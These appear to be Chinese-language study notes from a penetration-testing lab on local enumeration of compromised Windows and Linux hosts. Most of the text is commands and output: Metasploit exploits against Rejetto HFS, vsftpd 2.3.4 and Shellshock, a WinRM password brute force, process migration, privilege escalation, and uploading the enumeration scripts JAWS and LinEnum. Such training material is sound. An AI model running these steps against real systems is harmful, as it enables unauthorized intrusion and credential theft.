# Windows Local Enumeration
## Enumerating System Information - Windows
	獲得了對 Windows 目標系統的存取權限 : 
		識別 Windows 目標系統上執行的易受攻擊的服務: 
		nmap -sV demo.ine.local
		
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		使用 Searchsploit 搜尋漏洞: 
		searchsploit rejetto

		msfconsole -q 
		use exploit/windows/http/rejetto_hfs_exec
		set RHOSTS demo.ine.local
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	始列舉本機系統資訊: 
		meterpreter > sysinfo
		=> 提供了主機名稱、作業系統架構以及目標系統所屬網域等資訊
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		shell> hostname
		獲取有關目標系統的全面信息
		shell> systeminfo
		目標上運行的 Windows 版本、作業系統版本號、硬體配置，以及最重要的是目標系統上安裝的 Windows HotFixes
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		獲取系統上已安裝更新的列表，其中包含更詳細的信息
		shell> wmic qfe get Caption,Description,HotFixID,InstalledOn

## Enumerating Users & Groups - Windows
	列舉我們在目標系統上有權存取的目前使用者
		meterpreter > getuid
		
		Server username: WIN-OMCNBKR66MN\Administrator
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉管理員使用者擁有的Windows 權限
		meterpreter > getprivs
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	顯示目標系統上目前登入的使用者和先前登入的使用者
		background
		use post/windows/gather/enum_logged_on_users
		set SESSION 1
		run
		
		 SID                                            User
		 ---                                            ----
		 S-1-5-21-2563855374-3215282501-1490390052-500  WIN-OMCNBKR66MN\Administrator
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sessions 1
		shell
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉目前使用者以及該使用者擁有的權限
		whoami
		whoami /priv    <--> getprivs
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	取得系統上的使用者帳戶清單
		net users
	
		User accounts for \\WIN-OMCNBKR66MN
		-------------------------------------------------------------------------------
		Administrator            Guest    
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
	了解有關管理員帳戶的更多資訊
		net user administrator
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉系統上的群組
		net localgroup
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	查看特定群組的成員
		net localgroup administrators
	
		Members
		-------------------------------------------------------------------------------
		Administrator

## Enumerating Network Information - Windows
	meterpreter > shell
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉網路資訊
		ipconfig
		IPv4 Address. . . . . . . . . . . : 10.0.21.159
	
		ipconfig /all (目標系統的 MAC 位址)
		Physical Address. . . . . . . . . : 06-05-8F-3E-62-7F
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	路由表
		route print
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	顯示 ARP 快取以發現目標網路上的其他 IP 位址
	arp -a
	
	Interface: 10.0.21.159 --- 0x16
	  Internet Address      Physical Address      Type
	  10.0.16.1             06-73-41-c8-ca-42     dynamic   
	  10.0.24.47            06-6d-76-fa-cd-9e     dynamic   
	  10.0.24.176           06-20-14-ab-88-8c     dynamic   
	  10.0.31.103           06-4d-7a-33-38-c2     dynamic  
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	查看目標系統上的服務正在使用的開放連接埠列表，
		netstat -ano
	=> 顯示目標系統上開啟的連接埠清單及其各自的狀態和進程 ID (PID)
	
	Proto  Local Address          Foreign Address        State           PID
	  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2232
	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       600
	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1860
## Enumerating Processes and Services
	枚舉進程與服務
	=> 顯示目標系統上執行的所有進程的列表，以及進程 ID (PID)、使用者和程式路徑
	meterpreter > ps
	
		PID   PPID  Name                Arch  Session  User                           Path
		 ---   ----  ----                ----  -------  ----                           ----
	
		 272   484   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM    
  	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	C:\Windows\System32\spoolsv.exe
 	
		 324   316   csrss.exe           x64   0
		 336   484   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\SSM\amazo
             xe                                                                n-ssm-agent.exe
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	定位並識別explorer.exe進程的進程ID
	pgrep explorer.exe
	
		2208
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	夠透過 PID 遷移到不同的進程
	migrate 2208
		(只有在目標系統上有提升的會話時，您才能遷移到其他進程!!!)
	
		[*] Migrating from 1840 to 2208...
		[*] Migration completed successfully.
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		shell
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉正在運行的服務清單
	net start
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	了解有關正在運行的服務的更多資訊
	wmic service list brief
	
		ExitCode  Name                      ProcessId  StartMode  State    Status  
		0         AeLookupSvc               716        Manual     Running  OK      
		1077      ALG                       0          Manual     Stopped  OK   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉正在運行的任務清單以及每個任務對應的服務
	tasklist /SVC
	
		Image Name                     PID Services                                    
		========================= ======== ============================================
		svchost.exe                    964 BFE, DPS                                    
		spoolsv.exe                    272 Spooler                                     
		amazon-ssm-agent.exe           336 AmazonSSMAgent   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Windows 目標上的排程任務列表
	schtasks /query /fo LIST
 	
		Folder: \
		HostName:      WIN-OMCNBKR66MN
		TaskName:      \Ec2ConfigMonitorTask
		Next Run Time: N/A
		Status:        Ready
		Logon Mode:    Interactive/Background
## Automating Windows Local Enumeration
	nmap -T4 -PA -sC -sV -p 1-10000 demo.ine.local
		5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		|_http-server-header: Microsoft-HTTPAPI/2.0                 

	WinRM 2.0（Microsoft Windows 遠端管理） :
		5985/TCP - HTTP
		5986/TCP - HTTPS
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit WinRM  
		WinRM - VBS Remote Code Execution (Metasploit)          | windows/remote/22526.rb 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		search WinRM
	
		use scanner/winrm/winrm_auth_methods
		set RHOST demo.ine.local
		set RPORT 5985
		set SSL false
		run

	[+] 10.0.23.37:5985: Negotiate protocol supported
	[+] 10.0.23.37:5985: Basic protocol supported
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/scanner/winrm/winrm_login 
		set PASSWORD anything
		set RHOSTS demo.ine.local
		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
		set VERBOSE false
		run
	[+] 10.0.23.37:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sessions -u 1
		sessions -i 2
		meterpreter >
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use exploit/windows/winrm/winrm_script_exec
		set RHOSTS demo.ine.local
		set USERNAME administrator
		set PASSWORD tinkerbell
		set FORCE_VBS false
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > background
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	自動列舉目前使用者權限: 
	use post/windows/gather/win_privs
		set SESSION 2
		run

	Current User
	============
	 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
	 --------  ---------  -----------------------  -----------  -------------  ---
	 True      False      True                     True         1              SERVER\Administrator

	Windows Privileges
	==================
	 SeBackupPrivilege

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉目前和先前登入的使用者的清單:
	use post/windows/gather/enum_logged_on_users
		set SESSION 2
		run

	SID                                            Profile Path
	 ---                                            ------------
	 S-1-5-18                                       C:\Windows\system32\config\systemprofile
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	是否為虛擬機器: 
	use post/windows/gather/checkvm
		set SESSION 2
		run

	=> Checking if the target is a Virtual Machine \
	[+] This is a Xen Virtual Machine
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉目標系統上已安裝的應用程式/程式的清單:
	use post/windows/gather/enum_applications
		set SESSION 2
		run

		Installed Applications
		======================
		 AWS PV Drivers         8.3.4
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/windows/gather/enum_computers
		set SESSION 2
		run
	此模組顯示目標系統不屬於 Windows 網域
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉已安裝的更新和修補程式的清單:
	use post/windows/gather/enum_patches
		set SESSION 2
		run
	(HotFixID)
 ## Automating local enumeration with JAWS
	=> JAWS是一個開源 PowerShell 腳本
	(https://github.com/411Hall/JAWS) jaws-enum.ps1 
	nano jaws-enum.ps1  (copy)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > 
		getsystem
		pgrep explorer.exe
		migrate 3436
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	cd C:\\
		mkdir temp
		cd temp
		upload /root/jaws-enum.ps1
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		shell
		powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
		(將花費幾分鐘時間來完成枚舉過程)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > 
		download JAWS-Enum.txt
# Linux Local Enumeration 
## Enumerating System Information - Linux
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/unix/ftp/vsftpd_234_backdoor
		set RHOSTS demo.ine.local
		exploit
		id
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		CTRL + Z
		sessions -u 1
		sessions
		sessions -i 2
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	枚舉系統資訊
	meterpreter > sysinfo
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉系統的主機名稱
		shell
		/bin/bash -i
		hostname
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	動識別 Linux 發行版名稱和發行版本
		cat /etc/issue
		cat /etc/*release
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Linux 核心的版本
		uname -a
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	識別有關目標系統上正在使用的 CPU 的硬體資訊
		lscpu
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	查看Linux系統附加的儲存設備清單以及各自的掛載點和儲存容量資訊
		df -h
## Enumerating Users & Groups - Linux
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	有權存取的當前用戶: 
	meterpreter > getuid
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		shell
		/bin/bash -i
		whoami
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉 root 使用者所屬的群組: 
		groups root
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	取得Linux系統上的其他使用者和服務帳戶的清單:
		cat /etc/passwd
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉系統上存在的群組列表:
		groups
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	查看目前登入的使用者:
		who
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	取得最近登入系統的使用者清單
	lastlog
## Enumerating Network Information - Linux
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	枚舉網路資訊:
		meterpreter > ifconfig
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	取得目標系統上開放連接埠的清單
		netstat
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	路由表
		route
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	顯示連接到目標系統的網路介面清單
	background
		sessions -i 1
		/bin/bash -i
		ip a s
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉已配置網路及其子網路的清單：
		cat /etc/networks
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉本地映射的網域及其各自的 IP 位址的清單
		cat /etc/hosts
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	識別預設的 DNS 名稱伺服器位址
		cat /etc/resolv.conf
## Enumerating Processes and Cron Jobs
	列舉目標系統上正在運行的進程列表:
		meterpreter > ps
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	尋找特定服務的PID: 
		pgrep vsftpd
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉 Kali Linux 系統上的 cron 作業清單
		ls -al /etc/cron*

## Automating Linux Local Enumeration
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ifconfig (192.23.89.2)
	msfconsole -q
		use exploit/multi/http/apache_mod_cgi_bash_env_exec
		set RHOSTS demo.ine.local
		set TARGETURI /gettime.cgi
		set LHOST 192.23.89.2
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > background
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉 Linux 目標上的設定檔列表
		use post/linux/gather/enum_configs
		set SESSION 1
		run
	
	(*.conf)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	自動列舉目標系統的網路資訊
		use post/linux/gather/enum_network
		set SESSION 1
		run
	
	[+] Network config 
	[+] Route table 
	[+] DNS config
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	自動枚舉本機系統資訊
		use post/linux/gather/enum_system
		set SESSION 1
		run
	
	[+]     Module running as "daemon" user
	[*] Linux version
	[*] User accounts
	[*] Installed Packages
	[*] Cron jobs 
	[*] Disk info 
	[*] Logfiles 
	[*] Setuid/setgid 
	[*] CPU Vulnerabilities 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 LinEnum 自動執行本地枚舉
	(https://github.com/rebootuser/LinEnum) --  LinEnum.sh 
		nano LinEnum.sh 
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sessions 1
		meterpreter > cd /tmp
		upload /root/LinEnum.sh
		shell
		/bin/bash -i
		chmod +x LinEnum.sh
		./LinEnum.sh
